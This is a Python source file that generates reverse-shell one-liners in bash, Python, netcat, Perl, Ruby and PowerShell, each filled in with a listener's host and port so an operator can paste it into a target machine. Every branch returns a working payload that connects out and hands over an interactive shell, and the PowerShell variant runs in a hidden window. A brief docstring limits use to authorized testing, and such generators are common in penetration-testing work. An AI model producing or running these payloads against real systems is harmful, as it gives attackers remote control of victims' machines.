"""Reverse-shell one-liner generators.

These are stamped with the listener's host:port so an operator can paste
them directly into a target. Defensive note: only intended for authorized
testing — see the project README's ethics section.
"""
from __future__ import annotations

KINDS = ("bash", "python", "nc", "powershell", "perl", "ruby")


def _resolve_host(host: str) -> str:
    """0.0.0.0 / :: / empty bind isn't a valid destination; fall back to localhost."""
    if host in ("0.0.0.0", "::", ""):
        return "127.0.0.1"
    return host


def generate(kind: str, host: str, port: int) -> str | None:
    """Return a shell-ready one-liner for the given target shell.

    Returns None for unknown kinds so the caller can surface a friendly error.
    """
    h = _resolve_host(host)
    p = int(port)

    if kind == "bash":
        return f"bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'"

    if kind == "python":
        return (
            f'python3 -c \'import socket,os,subprocess;'
            f's=socket.socket();s.connect(("{h}",{p}));'
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )

    if kind == "nc":
        # mkfifo trick — nc on most distros lacks -e
        return (
            f"rm -f /tmp/.p; mkfifo /tmp/.p; "
            f"cat /tmp/.p | /bin/sh -i 2>&1 | nc {h} {p} > /tmp/.p"
        )

    if kind == "perl":
        return (
            f'perl -e \'use Socket;$i="{h}";$p={p};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
            f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            f"exec(\"/bin/sh -i\");}};'"
        )

    if kind == "ruby":
        return (
            f'ruby -rsocket -e \'exit if fork;'
            f'c=TCPSocket.new("{h}",{p});'
            f'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}};'
            f"end'"
        )

    if kind == "powershell":
        return (
            f"powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1 | Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);"
            f"$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()\""
        )

    return None
